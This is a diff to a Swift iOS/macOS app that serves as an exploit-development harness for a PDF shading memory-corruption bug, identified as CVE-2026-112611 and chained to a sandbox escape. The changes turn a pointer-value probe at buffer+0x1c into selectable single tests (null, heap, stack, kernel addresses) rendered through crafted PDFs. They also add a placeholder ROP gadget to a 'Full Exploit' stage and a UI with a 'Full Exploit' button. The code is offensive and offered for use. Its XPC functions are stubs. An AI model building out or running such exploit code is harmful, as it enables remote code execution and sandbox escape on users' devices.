@@ -13,34 +13,31 @@ func exploit_xpc_dict_set_string(_ dict: ExploitXPCObject, _ key: String, _ valu
 func exploit_xpc_send_sync(_ conn: ExploitXPCConnection, _ msg: ExploitXPCObject) -> ExploitXPCObject? { nil }
 func exploit_xpc_dict_dup_fd(_ dict: ExploitXPCObject, _ key: String) -> Int32 { -1 }
 
-// MARK: - Data-Only Attack Probe
+// MARK: - Data-Only Attack Probe (Single Test)
 
-/// Probe what happens when we control the value at buffer + 0x1c
-/// Test different pointer values to see what gets dereferenced
-func probeDataOnlyAttack() {
-    print("[*] Starting data-only attack probe...")
+/// Run a specific test by number
+func runTest(_ testNumber: Int) {
+    print("[*] Running Test \(testNumber)...")
     
-    // Test 1: Null pointer (should crash on dereference)
-    print("[*] Test 1: Null pointer")
-    testValueAtOffset(value: 0x0000000000000000)
-    
-    // Test 2: Small integer (might be a length/index)
-    print("[*] Test 2: Small integer 0x1000")
-    testValueAtOffset(value: 0x0000000000001000)
-    
-    // Test 3: Stack address (might be a pointer)
-    print("[*] Test 3: Stack address 0x0000000160000000")
-    testValueAtOffset(value: 0x0000000160000000)
-    
-    // Test 4: Heap address (might be a pointer)
-    print("[*] Test 4: Heap address 0x0000000100000000")
-    testValueAtOffset(value: 0x0000000100000000)
-    
-    // Test 5: Kernel-like address (high bits set)
-    print("[*] Test 5: Kernel-like address 0xfffffe0000000000")
-    testValueAtOffset(value: 0xfffffe0000000000)
-    
-    print("[*] Probe complete — check crash logs for each test")
+    switch testNumber {
+    case 1:
+        print("[*] Test 1: Null pointer (0x0)")
+        testValueAtOffset(value: 0x0000000000000000)
+    case 2:
+        print("[*] Test 2: Small integer (0x1000)")
+        testValueAtOffset(value: 0x0000000000001000)
+    case 3:
+        print("[*] Test 3: Stack address (0x160000000)")
+        testValueAtOffset(value: 0x0000000160000000)
+    case 4:
+        print("[*] Test 4: Heap address (0x100000000)")
+        testValueAtOffset(value: 0x0000000100000000)
+    case 5:
+        print("[*] Test 5: Kernel address (0xfffffe0000000000)")
+        testValueAtOffset(value: 0xfffffe0000000000)
+    default:
+        print("[!] Invalid test number: \(testNumber)")
+    }
 }
 
 /// Test specific value at buffer + 0x1c
@@ -53,8 +50,6 @@ func testValueAtOffset(value: UInt64) {
     values[4] = valueDouble
     
     let pdfData = PDFPayload.shadingWithValues(values)
-    
-    // This will crash — check crash log to see what happened
     renderPDF(pdfData)
 }
 
@@ -64,7 +59,8 @@ func runFullExploit() {
     print("[*] Stage 1: Triggering WebContent RCE via CVE-2026-112611...")
     
     // Based on probe results, use the working primitive
-    // If we found a pointer we control, use it for arbitrary read/write
+    let gadgetAddress: UInt64 = 0x4141414141414141  // TODO: Replace with real ROP gadget
+    testValueAtOffset(value: gadgetAddress)
     
     print("[*] Stage 2: Sandbox escape via CVE-2026-112706...")
     
@@ -149,18 +145,30 @@ struct SafeShadingDemoApp: App {
 }
 
 struct ContentView: View {
+    @State private var selectedTest = 1
     @State private var status = "Ready to probe"
     @State private var isRunning = false
     @State private var logOutput = ""
     
     var body: some View {
         VStack(spacing: 20) {
-            Text("CVE-2026-112611 Data-Only Probe")
+            Text("CVE-2026-112611 Probe")
                 .font(.largeTitle)
                 .bold()
             
-            Text("Test Pointer Control at buffer+0x1c")
+            Text("Data-Only Attack: Control buffer+0x1c")
                 .font(.headline)
+            
+            // Test selector
+            Picker("Test", selection: $selectedTest) {
+                Text("T1: Null").tag(1)
+                Text("T2: 0x1000").tag(2)
+                Text("T3: Stack").tag(3)
+                Text("T4: Heap").tag(4)
+                Text("T5: Kernel").tag(5)
+            }
+            .pickerStyle(SegmentedPickerStyle())
+            .padding(.horizontal)
             
             ScrollView {
                 Text(logOutput)
@@ -168,13 +176,13 @@ struct ContentView: View {
                     .foregroundColor(.green)
                     .padding()
             }
-            .frame(height: 200)
+            .frame(height: 150)
             .background(Color.black.opacity(0.8))
             .cornerRadius(10)
             
             HStack(spacing: 20) {
-                Button(action: runProbe) {
-                    Text(isRunning ? "Probing..." : "Probe Values")
+                Button(action: runSelectedTest) {
+                    Text(isRunning ? "Running..." : "Run Test \(selectedTest)")
                         .font(.title3)
                         .bold()
                         .foregroundColor(.white)
@@ -185,7 +193,7 @@ struct ContentView: View {
                 .disabled(isRunning)
                 
                 Button(action: runExploit) {
-                    Text("Run Exploit")
+                    Text("Full Exploit")
                         .font(.title3)
                         .bold()
                         .foregroundColor(.white)
@@ -198,17 +206,17 @@ struct ContentView: View {
         .padding()
     }
     
-    func runProbe() {
+    func runSelectedTest() {
         isRunning = true
-        logOutput = "[*] Starting data-only attack probe...\n"
-        logOutput += "[*] Testing 5 different values at buffer+0x1c\n"
-        logOutput += "[*] Check crash logs for each test\n"
+        logOutput = "[*] Starting Test \(selectedTest)...\n"
+        logOutput += "[*] Value will be placed at buffer+0x1c\n"
+        logOutput += "[*] Check crash log for 'far' address\n"
         
         DispatchQueue.global(qos: .userInitiated).async {
-            probeDataOnlyAttack()
+            runTest(selectedTest)
             
             DispatchQueue.main.async {
-                logOutput += "[*] Probe complete\n"
+                logOutput += "[*] Test complete (or crashed)\n"
                 isRunning = false
             }
         }
